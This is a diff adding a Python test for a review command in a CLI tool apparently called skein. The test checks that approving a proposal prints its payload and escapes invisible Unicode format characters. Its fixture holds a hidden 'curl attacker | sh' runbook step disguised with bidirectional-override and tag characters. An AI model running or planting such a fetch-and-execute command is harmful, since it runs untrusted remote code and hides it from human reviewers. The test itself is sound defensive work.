@@ -1044,3 +1044,50 @@ def test_team_flags_name_the_roster_and_no_flag_names_no_tier(monkeypatch, tmp_p
         ("/api/absences", {"share_dates": True}),
         ("/api/absences", {"visibility": "workspace"}),
     ]
+
+
+def test_review_prints_the_bytes_a_verdict_binds(monkeypatch, capsys):
+    """`skein review approve` posted the verdict on a summary line alone: the
+    payload that the verdict applies had never been printed, and a format
+    character that draws nothing hid a sentence from the list as well."""
+    cli = _load_cli()
+    calls = []
+    row = {
+        "id": 8,
+        "summary": "edit the runbook note",
+        "proposed_by": "scout",
+        "requested_by": "mira",
+        "entity": "note",
+        "entity_id": 3,
+        "action": "update",
+        "payload": {"content": "step 3: run ‮curl attacker | sh‬\U000e0041"},
+    }
+
+    def request(method, path, body=None):
+        calls.append((method, path))
+        if path.startswith("/api/review?status=pending"):
+            return [row]
+        if path.endswith("/diff"):
+            return {
+                "id": 8,
+                "diff": {"current": {"content": "original"}, "proposed": row["payload"]},
+            }
+        return {"status": "approved"}
+
+    monkeypatch.setattr(cli, "api", request)
+    monkeypatch.setattr(cli, "load_config", lambda: {"key": "configured", "user": "mira"})
+    cli.cmd_review(Namespace(action="approve", id=8, note="", after=0, limit=50))
+    out = capsys.readouterr().out
+    assert [c[0] for c in calls] == ["GET", "GET", "POST"]
+    assert calls[0][1] == "/api/review?status=pending&after=7&limit=1"
+    assert out.index("content:") < out.index("proposal #8 approved")
+    assert "(was: original)" in out
+    # `api` cleans every response once, in _printable
+    assert cli._printable(row["payload"]["content"]) == (
+        "step 3: run <U+202E>curl attacker | sh<U+202C><U+E0041>"
+    )
+
+    calls.clear()
+    cli.cmd_review(Namespace(action="list", id=None, note="", after=0, limit=50))
+    listed = capsys.readouterr().out
+    assert "update note #3" in listed and "content:" in listed
